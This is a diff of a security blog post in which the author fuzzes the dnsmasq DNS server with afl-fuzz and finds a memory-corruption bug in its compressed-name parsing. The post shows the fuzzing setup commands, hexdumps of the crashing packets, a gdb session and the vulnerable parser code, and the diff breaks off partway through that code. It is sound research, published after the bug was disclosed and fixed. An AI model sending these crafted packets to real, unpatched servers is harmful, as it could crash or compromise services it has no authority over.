@@ -12,30 +12,32 @@ categories:
     - Tools
 ---
 
-If you know me, you know that [I love DNS](https://github.com/iagox86/dnscat2). I'm not exactly sure how that happened, but I suspect that [Ed Skoudis](https://twitter.com/edskoudis) is at least partly to blame.
+If you know me, you know that <a href='https://github.com/iagox86/dnscat2'>I love DNS</a>. I'm not exactly sure how that happened, but I suspect that <a href='https://twitter.com/edskoudis'>Ed Skoudis</a> is at least partly to blame.
 
 Anyway, a project came up to evaluate dnsmasq, and being a DNS server - and a key piece of Internet infrastructure - I thought it would be fun! And it was! By fuzzing in a somewhat creative way, I found a really cool vulnerability that's almost certainly exploitable (though I haven't proven that for reasons that'll become apparent later).
 
-Although I started writing an exploit, I didn't finish it. I think it's almost certainly exploitable, so if you have some free time and you want to learn about exploit development, it's worthwhile having a look! [Here's a link](https://downloads.skullsecurity.org/DANGEROUS/dnsmasq-2.73rc7.tar.gz) to the actual distribution of a vulnerable version, and I'll discuss the work I've done so far at the end of this post.
+Although I started writing an exploit, I didn't finish it. I think it's almost certainly exploitable, so if you have some free time and you want to learn about exploit development, it's worthwhile having a look! <a href='https://downloads.skullsecurity.org/DANGEROUS/dnsmasq-2.73rc7.tar.gz'>Here's a link</a> to the actual distribution of a vulnerable version, and I'll discuss the work I've done so far at the end of this post.
 
-You can also download [my branch](https://github.com/iagox86/dnsmasq-fuzzing), which is similar to the vulnerable version (branched from it), the only difference is that it contains a bunch of fuzzing instrumentation and debug output around parsing names.
+You can also download <a href='https://github.com/iagox86/dnsmasq-fuzzing'>my branch</a>, which is similar to the vulnerable version (branched from it), the only difference is that it contains a bunch of fuzzing instrumentation and debug output around parsing names.
+<!--more--><style>.in { color: #dc322f; font-weight: bold; }</style>
+<h2>dnsmasq</h2>
 
-<style>.in { color: #dc322f; font-weight: bold; }</style>## dnsmasq
-
-For those of you who don't know, [dnsmasq](http://www.thekelleys.org.uk/dnsmasq/doc.html) is a service that you can run that handles a number of different protocols designed to configure your network: DNS, DHCP, DHCP6, TFTP, and more. We'll focus on DNS - I fuzzed the other interfaces and didn't find anything, though when it comes to fuzzing, absence of evidence isn't the same as evidence of absence.
+For those of you who don't know, <a href='http://www.thekelleys.org.uk/dnsmasq/doc.html'>dnsmasq</a> is a service that you can run that handles a number of different protocols designed to configure your network: DNS, DHCP, DHCP6, TFTP, and more. We'll focus on DNS - I fuzzed the other interfaces and didn't find anything, though when it comes to fuzzing, absence of evidence isn't the same as evidence of absence.
 
 It's primarily developed by a single author, Simon Kelley. It's had a reasonably clean history in terms of vulnerabilities, which may be a good thing (it's coded well) or a bad thing (nobody's looking) :)
 
 At any rate, the author's response was impressive. I made a little timeline:
 
-- May 12, 2015: Discovered
-- May 14, 2015: Reported to project
-- May 14, <s>2025</s>2015: Project responded with a patch candidate
-- May 15, 2015: Patch committed
+<ul>
+  <li>May 12, 2015: Discovered</li>
+  <li>May 14, 2015: Reported to project</li>
+  <li>May 14, <s>2025</s>2015: Project responded with a patch candidate</li>
+  <li>May 15, 2015: Patch committed</li>
+</ul>
 
 The fix was actually pushed out faster than I reported it! (I didn't report for a couple days because I was trying to determine how exploitable / scary it actually is - it turns out that yes, it's exploitable, but no, it's not scary - we'll get to why at the end).
 
-## DNS - the important bits
+<h2>DNS - the important bits</h2>
 
 The vulnerability is in the DNS name-parsing code, so it makes sense to spend a little time making sure you're familiar with DNS. If you're already familiar with how DNS packets and names are encoded, you can skip this section.
 
@@ -43,67 +45,71 @@ Note that I'm only going to cover the parts of DNS that matter to this particula
 
 DNS, at its core, is actually rather simple. A client wants to look up a hostname, so it sends a DNS packet containing a question to a DNS server (on UDP port 53, normally, but TCP can be used as well). Some magic happens, involving caches and recursion, then the server replies with a DNS message containing the original question, and zero or more answers.
 
-### DNS packet structure
+<h3>DNS packet structure</h3>
 
 The structure of a DNS packet is:
 
-- (int16) transaction id (trn\_id)
-- (int16) flags (which include QR \[query/response\], opcode, RD \[recursion desired\], RA \[recursion available\], and probably other stuff that I'm forgetting)
-- (int16) question count (qdcount)
-- (int16) answer count (ancount)
-- (int16) authority count (nscount)
-- (int16) additional count (arcount)
-- (variable) questions
-- (variable) answers
-- (variable) authorities
-- (variable) additionals
+<ul>
+  <li>(int16) transaction id (trn_id)</li>
+  <li>(int16) flags (which include QR [query/response], opcode, RD [recursion desired], RA [recursion available], and probably other stuff that I'm forgetting)</li>
+  <li>(int16) question count (qdcount)</li>
+  <li>(int16) answer count (ancount)</li>
+  <li>(int16) authority count (nscount)</li>
+  <li>(int16) additional count (arcount)</li>
+  <li>(variable) questions</li>
+  <li>(variable) answers</li>
+  <li>(variable) authorities</li>
+  <li>(variable) additionals</li>
+</ul>
 
 The last four fields - questions, answers, authorities, and additionals - are collectively called "resource records". Resource records of different types have different properties, but we aren't going to worry about that. The general structure of a question record is:
 
-- (variable) name (the important part!)
-- (int16) type (A/AAAA/CNAME/etc.)
-- (int16) class (basically always 0x0001, for Internet addresses)
+<ul>
+  <li>(variable) name (the important part!)</li>
+  <li>(int16) type (A/AAAA/CNAME/etc.)</li>
+  <li>(int16) class (basically always 0x0001, for Internet addresses)</li>
+</ul>
 
-### DNS names
+<h3>DNS names</h3>
 
 Questions and answers typically contain a domain name. A domain name, as we typically see it, looks like:
 
-```
-this.is.a.name.skullseclabs.org
-```
+<pre>this.is.a.name.skullseclabs.org</pre>
 
 But in a resource records, there aren't actually any periods, instead, each field is preceded by its length, with a null terminator (or a zero-length field) at the end:
 
-```
-\x04this\x02is\x01a\x04name\x0cskullseclabs\x03org\x00
-```
+<pre>\x04this\x02is\x01a\x04name\x0cskullseclabs\x03org\x00</pre>
 
 The maximum length of a field is 63 - 0x3f - bytes. If a field starts with 0x40, 0x80, 0xc0, and possibly others, it has a special meaning (we'll get to that shortly).
 
-### Questions and answers
+<h3>Questions and answers</h3>
 
 When you send a question to a DNS server, the packet looks something like:
 
-- (header)
-- question count = 1
-- question 1: ANY record for skullsecurity.org?
+<ul>
+  <li>(header)</li>
+  <li>question count = 1</li>
+  <li>question 1: ANY record for skullsecurity.org?</li>
+</ul>
 
 and the response looks like:
 
-- (header)
-- question count = 1
-- answer count = 11
-- question 1: ANY record for "skullsecurity.org"?
-- answer 1: "skullsecurity.org" has a TXT record of "oh hai NSA"
-- answer 2: "skullsecurity.org" has a MX record for "ASPMX.L.GOOGLE.com".
-- answer 3: "skullsecurity.org" has a A record for "206.220.196.59"
-- ...
+<ul>
+  <li>(header)</li>
+  <li>question count = 1</li>
+  <li>answer count = 11</li>
+  <li>question 1: ANY record for "skullsecurity.org"?</li>
+  <li>answer 1: "skullsecurity.org" has a TXT record of "oh hai NSA"</li>
+  <li>answer 2: "skullsecurity.org" has a MX record for "ASPMX.L.GOOGLE.com".</li>
+  <li>answer 3: "skullsecurity.org" has a A record for "206.220.196.59"</li>
+  <li>...</li>
+</ul>
 
 (yes, those are some of my real records :) )
 
-If you do the math, you'll see that "skullsecurity.org" takes up 18 bytes, and would be included in the response packet 12 times, counting the question, which means we're effectively wasting 18 \* 11 or close to 200 bytes. In the old days, 200 bytes were a lot. Heck, in the new days, 200 bytes are still a lot when you're dealing with millions of requests.
+If you do the math, you'll see that "skullsecurity.org" takes up 18 bytes, and would be included in the response packet 12 times, counting the question, which means we're effectively wasting 18 * 11 or close to 200 bytes. In the old days, 200 bytes were a lot. Heck, in the new days, 200 bytes are still a lot when you're dealing with millions of requests.
 
-### Record pointers
+<h3>Record pointers</h3>
 
 Remember how I said that name fields starting with numbers above 63 - 0x3f - are special? Well, the one we're going to pay attention to is 0xc0.
 
@@ -111,53 +117,56 @@ Remember how I said that name fields starting with numbers above 63 - 0x3f - are
 
 So typically, you'll see:
 
-- 12-bytes header (trn\_id + flags + counts)
-- question 1: ANY record for "skullsecurity.org"
-- answer 1: \\xc0\\x0c has a TXT record of "oh hai NSA"
-- answer 2: \\xc0\\x0c ...
+<ul>
+  <li>12-bytes header (trn_id + flags + counts)</li>
+  <li>question 1: ANY record for "skullsecurity.org"</li>
+  <li>answer 1: \xc0\x0c has a TXT record of "oh hai NSA"</li>
+  <li>answer 2: \xc0\x0c ...</li>
+</ul>
 
-"\\xc0" indicates a pointer is coming, and "\\x0c" says "look 0x0c (12) bytes from the start of the packet", which is immediately after the header. You can also use it as part of a domain name, so your answer could be "\\x03www\\xc0\\x0c", which would become "www.skullsecurity.org" (assuming that string was 12 bytes from the start).
+"\xc0" indicates a pointer is coming, and "\x0c" says "look 0x0c (12) bytes from the start of the packet", which is immediately after the header. You can also use it as part of a domain name, so your answer could be "\x03www\xc0\x0c", which would become "www.skullsecurity.org" (assuming that string was 12 bytes from the start).
 
 This is only mildly relevant, but a common problem that DNS parsers (both clients and servers) have to deal with is the infinite loop attack. Basically, the following packet structure:
 
-- 12-byte header
-- question 1: ANY record for "\\xc0\\x0c"
+<ul>
+  <li>12-byte header</li>
+  <li>question 1: ANY record for "\xc0\x0c"</li>
+</ul>
 
 Because question 1 is self-referential, it reads itself over and over and the name never finishes parsing. dnsmasq solves this by limiting reference to 256 hops - that decision prevents a denial-of-service attack, but it's also what makes this vulnerability likely exploitable. :)
 
-## Setting up the fuzz
+<h2>Setting up the fuzz</h2>
 
 All right, by now we're DNS experts, right? Good, because we're going to be building a DNS packet by hand right away!
 
-Before we get to the actual vulnerability, I want to talk about how I set up the fuzzing. Being a networked application, it makes sense to use a network fuzzer; however, I really wanted to try out [afl-fuzz](http://lcamtuf.coredump.cx/afl/) from [lcamtuf](https://twitter.com/lcamtuf), which is a file-format fuzzer.
+Before we get to the actual vulnerability, I want to talk about how I set up the fuzzing. Being a networked application, it makes sense to use a network fuzzer; however, I really wanted to try out <a href='http://lcamtuf.coredump.cx/afl/'>afl-fuzz</a> from <a href='https://twitter.com/lcamtuf'>lcamtuf</a>, which is a file-format fuzzer.
 
 afl-fuzz works as an intelligent file-format fuzzer that will instrument the executable (either by specially compiling it or using binary analysis) to determine whether or not it's hitting "new" code on each execution. It optimizes each cycle to take advantage of all the new code paths it's found. It's really quite cool!
 
 Unfortunately, DNS doesn't use files, it uses packets. But because the client and server each process only one single packet at a time, I decided to modify dnsmasq to read a packet from a file, parse it (either as a request or a response), then exit. That made it possible to fuzz with afl-fuzz.
 
-Unfortunately, that was actually pretty non-trivial. The parsing code and networking code were all mixed together. I ended up re-implementing "recv\_msg()" and "recv\_from()", among other things, and replacing their calls to those functions. That could also be done with a LD\_PRELOAD hook, but because I had source that wasn't necessary. If you want to see the changes I made to make it possible to fuzz, you can [search the codebase for "#ifdef FUZZ"](https://github.com/iagox86/dnsmasq-fuzzing/search?q=%22ifdef+FUZZ%22&type=Code) - I made the fuzzing stuff entirely optional.
+Unfortunately, that was actually pretty non-trivial. The parsing code and networking code were all mixed together. I ended up re-implementing "recv_msg()" and "recv_from()", among other things, and replacing their calls to those functions. That could also be done with a LD_PRELOAD hook, but because I had source that wasn't necessary. If you want to see the changes I made to make it possible to fuzz, you can <a href='https://github.com/iagox86/dnsmasq-fuzzing/search?q=%22ifdef+FUZZ%22&type=Code'>search the codebase for "#ifdef FUZZ"</a> - I made the fuzzing stuff entirely optional.
 
 If you want to follow along, you should be able to reproduce the crash with the following commands (I'm on 64-bit Linux, but I don't see why it wouldn't work elsewhere):
 
-```
-
-$ <span class="in">git clone <a href="https://github.com/iagox86/dnsmasq-fuzzing">https://github.com/iagox86/dnsmasq-fuzzing</a></span>
+<pre>
+$ <span class='in'>git clone <a href="https://github.com/iagox86/dnsmasq-fuzzing">https://github.com/iagox86/dnsmasq-fuzzing</a></span>
 Cloning into <span class="Statement">'</span><span class="Constant">dnsmasq-fuzzing</span><span class="Statement">'</span>...
 <span class="Comment">[...]</span>
-$ <span class="in">cd dnsmasq-fuzzing/</span>
-$ <span class="in">CFLAGS=-DFUZZ make -j10</span>
+$ <span class='in'>cd dnsmasq-fuzzing/</span>
+$ <span class='in'>CFLAGS=-DFUZZ make -j10</span>
 <span class="Comment">[...]</span>
-$ <span class="in">./src/dnsmasq -d --randomize-port --client-fuzz fuzzing/crashes/client-heap-overflow-1.bin</span>
+$ <span class='in'>./src/dnsmasq -d --randomize-port --client-fuzz fuzzing/crashes/client-heap-overflow-1.bin</span>
 dnsmasq: started, version  cachesize <span class="Constant">150</span>
 dnsmasq: compile <span class="Statement">time</span> options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth DNSSEC loop-detect inotify
 dnsmasq: reading /etc/resolv.conf
 <span class="Comment">[...]</span>
 Segmentation fault
-```
+</pre>
 
-Warning: DNS is recursive, and in my fuzzing modifications I didn't disable the recursive requests. That means that dnsmasq *will* forward some of your traffic to upstream DNS servers, and that traffic *could* impact those severs (and I actually proved that, by accident; but we won't get into that :) ).
+Warning: DNS is recursive, and in my fuzzing modifications I didn't disable the recursive requests. That means that dnsmasq <em>will</em> forward some of your traffic to upstream DNS servers, and that traffic <em>could</em> impact those severs (and I actually proved that, by accident; but we won't get into that :) ).
 
-## Doing the actual fuzzing
+<h2>Doing the actual fuzzing</h2>
 
 Once you've set up the program to be fuzzable, fuzzing it is actually really easy.
 
@@ -165,33 +174,33 @@ First, you need a DNS request and response - that way, we can fuzz both sides (t
 
 If you've wasted your life like I have, you can just write the request by hand and send it to a server, then capture the response:
 
-```
-<pre id="vimCodeElement">
-$ <span class="in">mkdir -p fuzzing/client/input/</span>
-$ <span class="in">mkdir -p fuzzing/client/output/</span>
-$ <span class="in">echo -ne "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01" > fuzzing/client/input/request.bin</span>
-$ <span class="in">mkdir -p fuzzing/server/input/</span>
-$ <span class="in">mkdir -p fuzzing/server/output/</span>
-$ <span class="in">cat request.bin | nc -vv -u 8.8.8.8 53 > fuzzing/server/input/response.bin</span>
-```
+<pre id='vimCodeElement'>
+$ <span class='in'>mkdir -p fuzzing/client/input/</span>
+$ <span class='in'>mkdir -p fuzzing/client/output/</span>
+$ <span class='in'>echo -ne &quot;\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01&quot; &gt; fuzzing/client/input/request.bin</span>
+$ <span class='in'>mkdir -p fuzzing/server/input/</span>
+$ <span class='in'>mkdir -p fuzzing/server/output/</span>
+$ <span class='in'>cat request.bin | nc -vv -u 8.8.8.8 53 &gt; fuzzing/server/input/response.bin</span>
+</pre>
 
 To break down the packet, in case you're curious
 
-- "\\x12\\x34" - trn\_id - just a random number
-- "\\x01\\x00" - flags - I think that flag is RD - recursion desired
-- "\\x00\\x01" - qdcount = 1
-- "\\x00\\x00" - ancount = 0
-- "\\x00\\x00" - nscount = 0
-- "\\x00\\x00" - arcount = 0
-- "\\x06google\\x03com\\x00" - name = "google.com"
-- "\\x00\\x01" - type = A record
-- "\\x00\\x01" - class = IN (Internet)
+<ul>
+  <li>"\x12\x34" - trn_id - just a random number</li>
+  <li>"\x01\x00" - flags - I think that flag is RD - recursion desired</li>
+  <li>"\x00\x01" - qdcount = 1</li>
+  <li>"\x00\x00" - ancount = 0</li>
+  <li>"\x00\x00" - nscount = 0</li>
+  <li>"\x00\x00" - arcount = 0</li>
+  <li>"\x06google\x03com\x00" - name = "google.com"</li>
+  <li>"\x00\x01" - type = A record</li>
+  <li>"\x00\x01" - class = IN (Internet)</li>
+</ul>
 
 You can verify it's working by hexdump'ing the response:
 
-```
-
-$ <span class="in">hexdump -C response.bin</span>
+<pre>
+$ <span class='in'>hexdump -C response.bin</span>
 00000000  12 34 81 80 00 01 00 0b  00 00 00 00 06 67 6f 6f  |.4...........goo|
 00000010  67 6c 65 03 63 6f 6d 00  00 01 00 01 c0 0c 00 01  |gle.com.........|
 00000020  00 01 00 00 01 2b 00 04  ad c2 21 67 c0 0c 00 01  |.....+....!g....|
@@ -205,66 +214,63 @@ $ <span class="in">hexdump -C response.bin</span>
 000000a0  00 01 00 00 01 2b 00 04  ad c2 21 60 c0 0c 00 01  |.....+....!`....|
 000000b0  00 01 00 00 01 2b 00 04  ad c2 21 65 c0 0c 00 01  |.....+....!e....|
 000000c0  00 01 00 00 01 2b 00 04  ad c2 21 62              |.....+....!b|
-```
+</pre>
 
-Notice how it starts with "\\x12\\x34" (the same transaction id I sent), has a question count of 1, has an answer count of 0x0b (11), and contains "\\x06google\\x03com\\x00" 12 bytes in (that's the question). That's basically what we discussed earlier. But the important part is, it has "\\xc0\\x0c" throughout. In fact, every answer starts with "\\xc0\\x0c", because every answer is to the first and only question.
+Notice how it starts with "\x12\x34" (the same transaction id I sent), has a question count of 1, has an answer count of 0x0b (11), and contains "\x06google\x03com\x00" 12 bytes in (that's the question). That's basically what we discussed earlier. But the important part is, it has "\xc0\x0c" throughout. In fact, every answer starts with "\xc0\x0c", because every answer is to the first and only question.
 
-That's exactly what I was talking about earlier - each of those 11 instances of "\\xc0\\x0c" saved about 10 bytes, so the packet is 110 bytes shorter than it would otherwise have been.
+That's exactly what I was talking about earlier - each of those 11 instances of "\xc0\x0c" saved about 10 bytes, so the packet is 110 bytes shorter than it would otherwise have been.
 
-Now that we have a base case for both the client and the server, we can compile the binary with afl-fuzz's instrumentation. Obviously, this command assumes that afl-fuzz is stored in "~/tools/afl-1.77b" - change as necessary. If you're trying to compile the original code, it doesn't accept CC= or CFLAGS= on the commandline unless you apply [this patch](https://github.com/iagox86/dnsmasq-fuzzing/commit/7658e692b7972284b602de18cfaf4ab6585f803b) first.
+Now that we have a base case for both the client and the server, we can compile the binary with afl-fuzz's instrumentation. Obviously, this command assumes that afl-fuzz is stored in "~/tools/afl-1.77b" - change as necessary. If you're trying to compile the original code, it doesn't accept CC= or CFLAGS= on the commandline unless you apply <a href='https://github.com/iagox86/dnsmasq-fuzzing/commit/7658e692b7972284b602de18cfaf4ab6585f803b'>this patch</a> first.
 
 Here's the compile command:
 
-```
-
-$ <span class="in">CC=~/tools/afl-1.77b/afl-gcc CFLAGS=-DFUZZ make -j20</span>
-```
+<pre>
+$ <span class='in'>CC=~/tools/afl-1.77b/afl-gcc CFLAGS=-DFUZZ make -j20</span>
+</pre>
 
 and run the fuzzer:
 
-```
-
-$ <span class="in">~/tools/afl-1.77b/afl-fuzz -i fuzzing/client/input/ -o fuzzing/client/output/ ./dnsmasq --client-fuzz=@@</span>
-```
+<pre>
+$ <span class='in'>~/tools/afl-1.77b/afl-fuzz -i fuzzing/client/input/ -o fuzzing/client/output/ ./dnsmasq --client-fuzz=@@</span>
+</pre>
 
 you can simultaneously fuzz the server, too, in a different window:
 
-```
-
-$ <span class="in">~/tools/afl-1.77b/afl-fuzz -i fuzzing/server/input/ -o fuzzing/server/output/ ./dnsmasq --server-fuzz=@@</span>
-```
+<pre>
+$ <span class='in'>~/tools/afl-1.77b/afl-fuzz -i fuzzing/server/input/ -o fuzzing/server/output/ ./dnsmasq --server-fuzz=@@</span>
+</pre>
 
 then let them run a few hours, or possibly overnight.
 
 For fun, I ran a third instance:
 
-```
-<pre id="vimCodeElement">
-$ <span class="in">mkdir -p fuzzing/hello/input</span>
-$ <span class="in">echo "hello" > fuzzing/hello/input/hello.bin</span>
-$ <span class="in">mkdir -p fuzzing/hello/output</span>
-$ <span class="in">~/tools/afl-1.77b/afl-fuzz -i fuzzing/fun/input/ -o fuzzing/fun/output/ ./dnsmasq --server-fuzz=@@</span>
-```
+<pre id='vimCodeElement'>
+$ <span class='in'>mkdir -p fuzzing/hello/input</span>
+$ <span class='in'>echo &quot;hello&quot; &gt; fuzzing/hello/input/hello.bin</span>
+$ <span class='in'>mkdir -p fuzzing/hello/output</span>
+$ <span class='in'>~/tools/afl-1.77b/afl-fuzz -i fuzzing/fun/input/ -o fuzzing/fun/output/ ./dnsmasq --server-fuzz=@@</span>
+</pre>
 
 ...which, in spite of being seeded with "hello" instead of an actual DNS packet, actually found an order of magnitude more crashes than the proper packets, except with much, much uglier proofs of concept.. :)
 
-## Fuzz results
+<h2>Fuzz results</h2>
 
 I let this run overnight, specifically to re-create the crashes for this blog. In the morning (after roughly 20 hours of fuzzing), the results were:
 
-- 7 crashes starting with a well formed request
-- 10 crashes starting from a well formed response
-- 93 crashes starting from "hello"
+<ul>
+  <li>7 crashes starting with a well formed request</li>
+  <li>10 crashes starting from a well formed response</li>
+  <li>93 crashes starting from "hello"</li>
+</ul>
 
-You can download the base cases and results [here](https://blogdata.skullsecurity.org/fuzz_dnsmasq.tar.bz2), if you want.
+You can download the base cases and results <a href='https://blogdata.skullsecurity.org/fuzz_dnsmasq.tar.bz2'>here</a>, if you want.
 
-### Triage
+<h3>Triage</h3>
 
 Although we have over a hundred crashes, I know from experience that they're all caused by the same core problem. But not knowing that, I need to pick something to triage! The difference between starting from a well formed request and starting from a "hello" string is noticeable... to take the smallest PoC from "hello", we have:
 
-```
-
-crashes $ <span class="in">hexdump -C id\:000024\,sig\:11\,src\:000234+000399\,op\:splice\,rep\:16</span>
+<pre>
+crashes $ <span class='in'>hexdump -C id\:000024\,sig\:11\,src\:000234+000399\,op\:splice\,rep\:16</span>
 00000000  68 00 00 00 00 01 00 02  e8 1f ec 13 07 06 e9 01  |h...............|
 00000010  67 02 e8 1f c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |g...............|
 00000020  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|
@@ -288,12 +294,11 @@ crashes $ <span class="in">hexdump -C id\:000024\,sig\:11\,src\:000234+000399\,o
 00000140  00 80 03 02 02 02 f0 7f  c7 00 80 1c 03 10 80 e6  |................|
 00000150  00 95 02 02 02 05 e7 67  02 02 02 02 02 02 02 00  |.......g........|
 00000160  00 80                                             |..|
-```
+</pre>
 
 Or, if we run afl-tmin on it to minimize:
 
-```
-
+<pre>
 00000000  30 30 00 30 00 01 30 30  30 30 30 30 30 30 30 30  |00.0..0000000000|
 00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
 00000020  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
@@ -307,147 +312,138 @@ Or, if we run afl-tmin on it to minimize:
 000000a0  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
 000000b0  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
 000000c0  05 30 30 30 30 30 c0 c0
-```
+</pre>
 
-(note the 0xc0 at the end - our old friend - but instead of figuring out "\\xc0\\x0c", the simplest case, it found a much more complex case)
+(note the 0xc0 at the end - our old friend - but instead of figuring out "\xc0\x0c", the simplest case, it found a much more complex case)
 
 Whereas here are all four crashing messages from the valid request starting point:
 
-```
-
-crashes $ <span class="in">hexdump -C id\:000000\,sig\:11\,src\:000034\,op\:flip2\,pos\:24</span>
+<pre>
+crashes $ <span class='in'>hexdump -C id\:000000\,sig\:11\,src\:000034\,op\:flip2\,pos\:24</span>
 00000000  12 34 01 00 00 01 00 00  00 00 00 00 06 67 6f 6f  |.4...........goo|
 00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|
 0000001c
-```
+</pre>
 
-```
-
-crashes $ <span class="in">hexdump -C id\:000001\,sig\:11\,src\:000034\,op\:havoc\,rep\:4</span>
+<pre>
+crashes $ <span class='in'>hexdump -C id\:000001\,sig\:11\,src\:000034\,op\:havoc\,rep\:4</span>
 00000000  12 34 08 00 00 01 00 00  e1 00 00 00 06 67 6f 6f  |.4...........goo|
 00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|
 0000001c
-```
+</pre>
 
-```
-
-crashes $ <span class="in">hexdump -C id\:000002\,sig\:11\,src\:000034\,op\:havoc\,rep\:2</span>
+<pre>
+crashes $ <span class='in'>hexdump -C id\:000002\,sig\:11\,src\:000034\,op\:havoc\,rep\:2</span>
 00000000  12 34 01 00 eb 00 00 00  00 00 00 00 06 67 6f 6f  |.4...........goo|
 00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|
-```
+</pre>
 
-```
-
-crashes $ <span class="in">hexdump -C id\:000003\,sig\:11\,src\:000034\,op\:havoc\,rep\:4</span>
+<pre>
+crashes $ <span class='in'>hexdump -C id\:000003\,sig\:11\,src\:000034\,op\:havoc\,rep\:4</span>
 00000000  12 34 01 00 00 01 01 00  00 00 10 00 06 67 6f 6f  |.4...........goo|
 00000010  67 6c 65 03 63 6f 6d c0  0c 00 00 00 00 00 06 67  |gle.com........g|
 00000020  6f 6f 67 6c 65 03 63 6f  6d c0 00 01 00 01        |oogle.com.....|
 0000002e
-```
+</pre>
 
 The first three crashes are interesting, because they're very similar. The only differences are the flags field (0x0100 or 0x0800) and the count fields (the first is unmodified, the second has 0xe100 "authority" records listed, and the third has 0xeb00 "question" records). Presumably, that stuff doesn't matter, since random-looking values work.
 
-Also note that near the end of every message, we see our old friend again: "\\xc0\\x0c".
+Also note that near the end of every message, we see our old friend again: "\xc0\x0c".
 
 We can run afl-tmin on the first one to get the tightest message we can:
 
-```
-
+<pre>
 00000000  30 30 30 30 30 30 30 30  30 30 30 30 06 30 6f 30  |000000000000.0o0|
 00000010  30 30 30 03 30 30 30 c0  0c                       |000.000..|
-```
+</pre>
 
-As predicted, the question and answer counts don't matter. All that matters is the name's length fields and the "\\xc0\\x0c". Oddly it included the "o" from google.com, which is probably a bug (my fuzzing instrumentation isn't perfect because due to requests going to the Internet, the result isn't always deterministic).
+As predicted, the question and answer counts don't matter. All that matters is the name's length fields and the "\xc0\x0c". Oddly it included the "o" from google.com, which is probably a bug (my fuzzing instrumentation isn't perfect because due to requests going to the Internet, the result isn't always deterministic).
 
-## The vulnerability
+<h2>The vulnerability</h2>
 
 Now that we have a decent PoC, let's check it out in a debugger:
 
-```
-
-$ <span class="in">gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./min.bin</span>
+<pre>
+$ <span class='in'>gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./min.bin</span>
 Reading symbols from ./dnsmasq...done.
 Unable to determine compiler version.
 Skipping loading of libstdc++ pretty-printers for now.
-(gdb) <span class="in">run</span>
+(gdb) <span class='in'>run</span>
 [...]
 Program received signal SIGSEGV, Segmentation fault.
 __strcpy_sse2 () at ../sysdeps/x86_64/multiarch/../strcpy.S:135
 135     ../sysdeps/x86_64/multiarch/../strcpy.S: No such file or directory.
-```
+</pre>
 
 It crashed in strcpy. Fun! Let's see the line it crashed on:
 
-```
-<pre id="vimCodeElement">
-(gdb) <span class="in">x/i $rip</span>
-=> <span class="Constant">0x7ffff73cc600</span> <__strcpy_sse2+<span class="Constant">192</span>>:  mov    BYTE PTR [rdx],al
-(gdb) <span class="in">print/x $rdx</span>
+<pre id='vimCodeElement'>
+(gdb) <span class='in'>x/i $rip</span>
+=&gt; <span class="Constant">0x7ffff73cc600</span> &lt;__strcpy_sse2+<span class="Constant">192</span>&gt;:  mov    BYTE PTR [rdx],al
+(gdb) <span class='in'>print/x $rdx</span>
 $1 = <span class="Constant">0x0</span>
-```
+</pre>
 
 Oh, a null-pointer write. Seems pretty lame.
 
 Honestly, when I got here, I lost steam. Null-pointer dereferences need to be fixed, especially because they can hide other bugs, but they aren't going to earn me l33t status. So I would have to fix it or deal with hundreds of crappy results.
 
-If we look at the packet in more detail, the name it's parsing is essentially: "\\x06AAAAAA\\x03AAA\\xc0\\x0c" (changed '0' to 'A' to make it easier on the eyes). The "\\xc0\\x0c" construct reference 12 bytes into the message, which is the start of the name. When it's parsed, after one round, it'll be "\\x06AAAAAA\\x03AAA\\x06AAAAAA\\x03AAA\\xc0\\x0c". But then it reaches the "\\xc0\\x0c" again, and goes back to the beginning. Basically, it infinite loops in the name parser.
+If we look at the packet in more detail, the name it's parsing is essentially: "\x06AAAAAA\x03AAA\xc0\x0c" (changed '0' to 'A' to make it easier on the eyes). The "\xc0\x0c" construct reference 12 bytes into the message, which is the start of the name. When it's parsed, after one round, it'll be "\x06AAAAAA\x03AAA\x06AAAAAA\x03AAA\xc0\x0c". But then it reaches the "\xc0\x0c" again, and goes back to the beginning. Basically, it infinite loops in the name parser.
 
 So, it's obvious that a self-referential name causes the problem. But why?
 
 I tracked down the code that handles 0xc0. It's in rfc1035.c, and looks like:
 
-```
-<pre id="vimCodeElement">
+<pre id='vimCodeElement'>
      <span class="Statement">if</span> (label_type == <span class="Constant">0xc0</span>) <span class="Comment">/*</span><span class="Comment"> pointer </span><span class="Comment">*/</span>
         {
           <span class="Statement">if</span> (!CHECK_LEN(header, p, plen, <span class="Constant">1</span>))
             <span class="Statement">return</span> <span class="Constant">0</span>;
 
           <span class="Comment">/*</span><span class="Comment"> get offset </span><span class="Comment">*/</span>
-          l = (l&<span class="Constant">0x3f</span>) << <span class="Constant">8</span>;
+          l = (l&amp;<span class="Constant">0x3f</span>) &lt;&lt; <span class="Constant">8</span>;
           l |= *p++;
 
           <span class="Statement">if</span> (!p1) <span class="Comment">/*</span><span class="Comment"> first jump, save location to go back to </span><span class="Comment">*/</span>
             p1 = p;
 
           hops++; <span class="Comment">/*</span><span class="Comment"> break malicious infinite loops </span><span class="Comment">*/</span>
-          <span class="Statement">if</span> (hops > <span class="Constant">255</span>)
+          <span class="Statement">if</span> (hops &gt; <span class="Constant">255</span>)
           {
-            printf(<span class="Constant">"Too many hops!</span><span class="Special">\n</span><span class="Constant">"</span>);
-            printf(<span class="Constant">"Returning: [</span><span class="Special">%d</span><span class="Constant">] </span><span class="Special">%s</span><span class="Special">\n</span><span class="Constant">"</span>, ((<span class="Type">uint64_t</span>)cp) - ((<span class="Type">uint64_t</span>)name), name);
+            printf(<span class="Constant">&quot;Too many hops!</span><span class="Special">\n</span><span class="Constant">&quot;</span>);
